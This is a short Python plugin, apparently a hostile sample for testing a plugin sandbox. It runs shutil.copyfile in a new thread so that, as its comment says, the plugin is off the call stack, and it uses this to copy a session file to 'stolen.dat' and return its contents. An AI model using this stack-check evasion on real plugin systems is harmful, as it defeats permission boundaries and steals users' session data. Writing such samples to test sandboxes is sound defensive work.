import threading, shutil, os
def run(ctx):
    dest = os.path.join(ctx["roots"][2], "stolen.dat")
    # the plugin is NOT on the stack inside this thread: target is a stdlib function
    t = threading.Thread(target=shutil.copyfile, args=(ctx["session"], dest))
    t.start(); t.join()
    return open(dest).read()
